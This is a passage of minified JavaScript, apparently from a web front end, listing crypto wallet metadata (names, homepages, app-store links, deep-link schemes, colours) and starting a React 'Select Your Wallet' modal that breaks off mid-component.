    "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14": {
        id: "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14",
        name: "Nash",
        homepage: "https://nash.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/nash-app/id1475759236",
            android: "https://play.google.com/store/apps/details?id=io.nash.app",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "nash:",
            universal: "https://nash.io/walletconnect"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Nash",
            colors: {
                primary: "rgb(0,82,243)",
                secondary: ""
            }
        }
    },
    "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814": {
        id: "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814",
        name: "Coinomi",
        homepage: "https://coinomi.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/coinomi-wallet/id1333588809",
            android: "https://play.google.com/store/apps/details?id=com.coinomi.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Coinomi",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702": {
        id: "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702",
        name: "GridPlus",
        homepage: "https://gridplus.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "GridPlus",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5: {
        id: "a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5",
        name: "CYBAVO Wallet",
        homepage: "https://cybavo.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/tw/app/cybavo-wallet/id1510697681",
            android: "https://play.google.com/store/apps/details?id=com.cybavo.btc.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "cybavowallet:",
            universal: "https://cdn.cybavo.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "CYBAVO",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0: {
        id: "c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0",
        name: "Tokenary",
        homepage: "https://tokenary.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/tokenary-ethereum-wallet/id1372886601",
            android: "https://play.google.com/store/apps/details?id=com.jufy.tokenary",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Tokenary",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50": {
        id: "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50",
        name: "Torus",
        homepage: "https://toruswallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "https://app.tor.us/",
            ios: "",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Torus",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09": {
        id: "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09",
        name: "Spatium",
        homepage: "https://spatium.net/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/spatium/id1404844195",
            android: "https://play.google.com/store/apps/details?id=capital.spatium.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Spatium",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150": {
        id: "0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150",
        name: "SafePal",
        homepage: "https://safepal.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/safepal-wallet/id1548297139",
            android: "https://play.google.com/store/apps/details?id=io.safepal.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "safepalwallet:",
            universal: "https://link.safepal.io"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "SafePal",
            colors: {
                primary: "rgb(0, 128, 255)",
                secondary: ""
            }
        }
    },
    d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6: {
        id: "d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6",
        name: "Infinito",
        homepage: "https://infinitowallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/infinito-wallet/id1315572736",
            android: "https://play.google.com/store/apps/details?id=io.infinito.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Infinito",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b": {
        id: "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b",
        name: "wallet.io",
        homepage: "https://wallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/vn/app/wallet-io/id1459857368",
            android: "https://play.google.com/store/apps/details?id=io.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "wallet.io",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f": {
        id: "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f",
        name: "Infinity Wallet",
        homepage: "https://infinitywallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "",
            mac: "https://infinitywallet.io/desktop",
            windows: "https://infinitywallet.io/desktop",
            linux: "https://infinitywallet.io/desktop"
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Infinity",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad": {
        id: "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad",
        name: "Ownbit",
        homepage: "https://ownbit.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/es/app/ownbit-btc-eth-cold-wallet/id1321798216",
            android: "https://play.google.com/store/apps/details?id=com.bitbill.www",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Ownbit",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c": {
        id: "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c",
        name: "EasyPocket",
        homepage: "https://easypocket.app/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/id1517338927",
            android: "https://easypocket.app/",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "easypocket:",
            universal: "https://wallet.easypocket.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "EasyPocket",
            colors: {
                primary: "rgb(17, 93, 251)",
                secondary: ""
            }
        }
    },
    "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb": {
        id: "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb",
        name: "Bridge Wallet",
        homepage: "https://mtpelerin.com/bridge-wallet",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/bridge-wallet/id1481859680",
            android: "https://play.google.com/store/apps/details?id=com.mtpelerin.bridge",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Bridge",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1": {
        id: "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1",
        name: "SparkPoint",
        homepage: "https://sparkpoint.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=com.sparkpoint",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "sparkpoint:",
            universal: "https://sparkpoint.io"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "SparkPoint",
            colors: {
                primary: "rgb(20,67,95)",
                secondary: ""
            }
        }
    },
    ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1: {
        id: "ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1",
        name: "ViaWallet",
        homepage: "https://viawallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/us/app/viawallet/id1462031389",
            android: "https://play.google.com/store/apps/details?id=com.viabtc.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "ViaWallet",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106": {
        id: "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106",
        name: "BitKeep",
        homepage: "https://bitkeep.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/bitkeep/id1395301115",
            android: "https://play.google.com/store/apps/details?id=com.bitkeep.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "bitkeep:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "BitKeep",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c: {
        id: "b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c",
        name: "Vision",
        homepage: "https://vision-crypto.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/id1500186931",
            android: "https://play.google.com/store/apps/details?id=com.eletac.tronwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Vision",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b": {
        id: "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b",
        name: "PEAKDEFI Wallet",
        homepage: "https://peakdefi.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/peakdefi-wallet/id1526193527",
            android: "https://play.google.com/store/apps/details?id=com.peakdefiwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "peakdefiwallet:",
            universal: "https://peakdefi.com/download"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "PEAKDEFI",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd": {
        id: "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd",
        name: "Unstoppable Wallet",
        homepage: "https://unstoppable.money/",
        chains: ["eip155:1", "eip155:56"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/bank-bitcoin-wallet/id1447619907?ls=1",
            android: "https://play.google.com/store/apps/details?id=io.horizontalsystems.bankwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "moneyunstoppable:",
            universal: "https://unstoppable.money/"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Unstoppable",
            colors: {
                primary: "#FFBE43",
                secondary: ""
            }
        }
    },
    "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0": {
        id: "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0",
        name: "HaloDeFi Wallet",
        homepage: "https://halodefi.org/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=com.halodefi.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "halodefiwallet:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "HaloDeFi",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e: {
        id: "d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e",
        name: "Dok Wallet",
        homepage: "https://dokwallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/il/app/dokwallet-crypto-wallet/id1533065700",
            android: "https://play.google.com/store/apps/details?id=com.dok.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Dok",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5": {
        id: "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5",
        name: "AT.Wallet",
        homepage: "https://authentrend.com/at-wallet/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/at-wallet/id1479171310",
            android: "https://play.google.com/store/apps/details?id=com.authentrend.atwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "AT.Wallet",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719": {
        id: "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719",
        name: "Midas Wallet",
        homepage: "https://midasprotocol.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/us/app/midas-protocol-crypto-wallet/id1436698193",
            android: "https://play.google.com/store/apps/details?id=com.midasprotocol.wallet.android",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Midas",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef": {
        id: "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef",
        name: "Ellipal",
        homepage: "https://ellipal.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/ellipal/id1426179665",
            android: "https://play.google.com/store/apps/details?id=com.ellipal.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "ellipal:",
            universal: "https://www.ellipal.com/"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Ellipal",
            colors: {
                primary: "rgb(48, 124, 249)",
                secondary: ""
            }
        }
    },
    "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3": {
        id: "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3",
        name: "KEYRING PRO",
        homepage: "https://keyring.app/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/keyring-pro-wallet-management/id1546824976",
            android: "https://play.google.com/store/apps/details?id=co.bacoor.keyring",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "keyring:",
            universal: "https://keyring.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "KEYRINGPRO",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c": {
        id: "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c",
        name: "Aktionariat",
        homepage: "https://aktionariat.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/ch/app/aktionariat/id1518326813",
            android: "https://play.google.com/store/apps/details?id=com.aktionariat.app",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "aktionariat:",
            universal: "https://app.aktionariat.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Aktionariat",
            colors: {
                primary: "rgb(10, 20, 20)",
                secondary: ""
            }
        }
    },
    "95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c": {
        id: "95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c",
        name: "Talken Wallet",
        homepage: "https://talken.io",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/talken/id1459475831",
            android: "https://play.google.com/store/apps/details?id=io.talken.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "talken-wallet:",
            universal: "https://talken.io"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Talken",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4": {
        id: "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4",
        name: "XinFin XDC Network",
        homepage: "https://www.xinfin.io/",
        chains: ["eip155:1"],
        app: {
            browser: "https://xinfin.network/",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=com.xdcwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "XinFin",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c: {
        id: "d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c",
        name: "Flare Wallet",
        homepage: "https://flarewallet.io",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/flare-wallet/id1496651406",
            android: "https://play.google.com/store/apps/details?id=com.flare",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "flare:",
            universal: "https://flarewallet.io"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Flare",
            colors: {
                primary: "rgb(31, 36, 59)",
                secondary: ""
            }
        }
    },
    "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670": {
        id: "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670",
        name: "KyberSwap",
        homepage: "https://kyberswap.com/",
        chains: ["eip155:1"],
        app: {
            browser: "https://kyberswap.com/",
            ios: "",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "kyberswap:",
            universal: "https://kyberswapnew.app.link"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "KyberSwap",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0": {
        id: "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0",
        name: "AToken Wallet",
        homepage: "https://atoken.com",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/atoken-app/id1395835245",
            android: "https://play.google.com/store/apps/details?id=wallet.gem.com.atoken",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "atoken:",
            universal: "https://www.atoken.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "AToken",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9": {
        id: "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9",
        name: "Tongue Wallet",
        homepage: "https://www.tongue.fi",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/fr/app/tongue-wallet-for-defi-degens/id1534705854",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "tongue:",
            universal: "https://www.tongue.fi"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Tongue",
            colors: {
                primary: "rgb(255, 49, 120)",
                secondary: ""
            }
        }
    },
    b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346: {
        id: "b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346",
        name: "RWallet",
        homepage: "https://rsk.co/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/rwallet/id1489241342",
            android: "https://play.google.com/store/apps/details?id=com.rsk.rwallet.reactnative",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "rwallet:",
            universal: "https://www.rwallet.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "RWallet",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70": {
        id: "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70",
        name: "PlasmaPay",
        homepage: "https://plasmapay.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/id1461735396",
            android: "https://play.google.com/store/apps/details?id=com.plasmapay.androidapp",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "plasmapay:",
            universal: "https://plasmapay.com/"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "PlasmaPay",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0": {
        id: "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0",
        name: "O3Wallet",
        homepage: "https://o3.network",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/id1528451572",
            android: "https://play.google.com/store/apps/details?id=com.o3.o3wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "o3wallet:",
            universal: "https://o3.network"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "O3Wallet",
            colors: {
                primary: "rgb(255,255,255)",
                secondary: ""
            }
        }
    },
    "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c": {
        id: "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c",
        name: "HashKey Me",
        homepage: "https://me.hashkey.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/hashkey-me/id1547228803",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "hashme:",
            universal: "https://me.hashkey.com"
        },
        desktop: {
            native: "hashme:",
            universal: "https://me.hashkey.com"
        },
        metadata: {
            shortName: "HashKey Me",
            colors: {
                primary: "rgb(254, 142, 63)",
                secondary: ""
            }
        }
    },
    "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950": {
        id: "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950",
        name: "Jade Wallet",
        homepage: "https://jadewallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/jade-wallet-bitcoin-defi/id1544207492",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Jade",
            colors: {
                primary: "#212d66",
                secondary: ""
            }
        }
    },
    c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266: {
        id: "c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266",
        name: "Guarda Wallet",
        homepage: "https://guarda.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/apple-store/id1442083982?mt=8",
            android: "https://play.google.com/store/apps/details?id=com.crypto.multiwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Guarda",
            colors: {
                primary: "#fff",
                secondary: ""
            }
        }
    },
    ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215: {
        id: "ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215",
        name: "Defiant",
        homepage: "https://defiantapp.tech/",
        chains: ["eip155:1", "eip155:42", "eip155:30", "eip155:31"],
        app: {
            browser: "",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=ar.com.andinasmart.defiant",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "defiantapp:",
            universal: "https://defiantapp.tech"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Defiant",
            colors: {
                primary: "#274A60",
                secondary: "#65ef9d"
            }
        }
    },
    "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1": {
        id: "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1",
        name: "Trustee Wallet",
        homepage: "https://trusteeglobal.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/trustee-wallet-bitcoin-wallet/id1462924276",
            android: "https://play.google.com/store/apps/details?id=com.trusteewallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Trustee",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    ex784227: {
        id: "1ce6dae0fea7114844",
        name: "Exodus",
        chains: ["eip155:1"]
    },
    others: {
        id: "1ce6dae0fea7114844",
        name: "Others",
        chains: ["eip155:1"]
    }
};

function q0({
    open: e,
    onClose: t,
    handleSelect: n
}) {
    return p.jsx(p.Fragment, {
        children: p.jsx(xe, {
            appear: !0,
            show: e,
            as: g.Fragment,
            children: p.jsxs(Pe, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [p.jsx(xe.Child, {
                    as: g.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: p.jsx("div", {
                        className: "fixed inset-0 bg-black/50"
                    })
                }), p.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: p.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: p.jsx(xe.Child, {
                            as: g.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: p.jsxs(Pe.Panel, {
                                className: "w-full max-w-xl transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [p.jsx(Pe.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6 text-gray-900",
                                    children: "Select Your Wallet"
                                }), p.jsx("div", {
                                    className: "mt-4 h-96 overflow-y-auto",
                                    children: p.jsx("div", {
                                        className: "grid grid-cols-3 sm:grid-cols-4 gap-4 pr-2.5",
                                        children: Object.keys(Tl).map((r, l) => p.jsxs("div", {
                                            tabIndex: l + 1,
